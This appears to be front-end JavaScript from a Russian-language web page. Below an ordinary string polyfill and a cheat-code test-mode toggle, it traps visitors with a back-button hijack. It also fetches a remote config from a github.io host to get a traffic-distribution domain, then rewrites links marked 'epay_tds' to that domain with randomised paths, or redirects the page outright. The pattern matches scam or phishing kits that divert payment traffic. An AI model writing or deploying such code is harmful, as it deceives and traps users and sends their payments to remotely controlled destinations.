  // IE 11 POLYFILL FOR INCLUDES
  if (!String.prototype.includes) {
    String.prototype.includes = function(search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }
  if(!!document.documentElement.dataset.ps && document.documentElement.dataset.ps=='b'){
    window.psDefault = 'b'
    // window.Cookies.set('psAlias', 'b')
    localStorage.setItem('psAlias', 'b')
    window.psAlias = localStorage.getItem('psAlias') || window.psDefault
  } else {
    window.psDefault = 'h'
    if(Array.isArray(window.psDomains)){
      for (var i = 0; i < window.psDomains.length; i++) {
        if(location.href.includes(window.psDomains[i].link)){
          localStorage.setItem('psAlias', window.psDomains[i].ps)
            // console.log('ps: ',window.psDomains[i].ps)
          }
      }
    }

    window.psAlias = localStorage.getItem('psAlias') || window.psDefault
  }

  window.preventHistory = true
  if(localStorage.getItem('isPreventHistory')){
    window.preventHistory = JSON.parse(localStorage.getItem('isPreventHistory').toLowerCase()) // "false"/"true" -> false/true
  } else {
    localStorage.setItem('isPreventHistory', window.preventHistory)
  }
  if(window.preventHistory){
    history.pushState(null, null, location.href);
    window.onpopstate = function(event) {
        history.go(1);
    };
  }


    let bufferArray = [];
    let lastKeystrokeTime = Date.now();

    //Our cheat code
    const cheatcode = "hesoyam";

    window.addEventListener("keyup", e => {
      const key = e.key.toLowerCase();
      const latestKeystrokeTime = Date.now();

      if (latestKeystrokeTime - lastKeystrokeTime > 1500) {
        bufferArray = [];
      }

      bufferArray.push(key);

      const word = bufferArray.join("");
      if (word === cheatcode) {
        test();
      }

      lastKeystrokeTime = latestKeystrokeTime;
    });

  window.test = function () {
    let current = localStorage.getItem('test')
    if(localStorage.getItem('test') || document.documentElement.classList.contains('testmode')){
      localStorage.removeItem('test')
      document.querySelector('#app').__vue__.isTestMode = false
      document.documentElement.classList.remove('testmode')
    } else {
      document.documentElement.classList.add('testmode')
      localStorage.setItem('test', true)
      document.querySelector('#app').__vue__.isTestMode = true
    }
    console.log('Test mode', localStorage.getItem('test') ? 'ON' : 'OFF')
    // Metrika Get Data
    // insert next button on upsells
  }
  // check if test() add testmode class to html
  if(localStorage.getItem('test')){
    document.documentElement.classList.add('testmode')
  } else if(document.documentElement.classList.contains('testmode')){
      document.documentElement.classList.remove('testmode')
  }

  // if(domain_from_url(window.location.hostname)[0]=='r'){
  //   window.lang = 'ru'
  // } else if(domain_from_url(window.location.hostname)[0]=='e'){
  //   window.lang = 'en'
  // } else {
  //   window.lang = 'ru'
  // }
    window.lang = 'ru'

  function domain_from_url(url) {
    var result
    var match
    if (match = url.match(/^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n\?\=]+)/im)) {
        result = match[1]
        if (match = result.match(/^[^\.]+\.(.+\..+)$/)) {
            result = match[1]
        }
    }
    return result
  }

getTdsDef();

function getTdsDef(){

    var xmlhttp_def = new XMLHttpRequest();
    xmlhttp_def.open("GET", "https://privat-session.github.io/com/deep.txt", true);
    xmlhttp_def.send();

    xmlhttp_def.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            proccess_main_urls(this.responseText);
        }
    };
}

function proccess_main_urls(data) {
    var data = JSON.parse(data);
    var tds_domain = data.tds_domain;
    var elem = document.getElementsByTagName("a");
    var gStr = strGen(13 + Math.ceil(Math.random() * 10));
    tds_domain = tds_domain.substring(0, tds_domain.length - 1);
    //if((typeof(redirect) != "undefined") && (redirect == true)) { 
    //    window.location = data.tds_domain + elem[0].pathname+ elem[0].search; return true; 
    //}

    if(!(isEmpty(elem)))
    {
        for (var j = 0; j < elem.length; j++) {
            if(elem[j].className.indexOf("epay_tds") > -1){
                
                if((typeof(redirect) != "undefined") && (redirect == true)) { 
                 window.location = data.tds_domain + elem[j].pathname+ elem[j].search; return true; 
                }

                pathname_current =  elem[j].pathname+'/'+gStr+'/';
                get_params = elem[j].search;
                elem[j].href = tds_domain + pathname_current + get_params;
               
            }
        }

    }
}

function isEmpty(obj) {
    if (obj.length == 0)
    {
        return true;
    }
    else{return false;}
}

function strGen(strLen) {
    var resStr = '';
    var symArray = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','0','1','2','3','4','5','6','7','8','9'];
    while(resStr.length < strLen) {
        resStr = resStr + symArray[Math.ceil((Math.random() * symArray.length) - 1)];
    }
    return resStr;
}

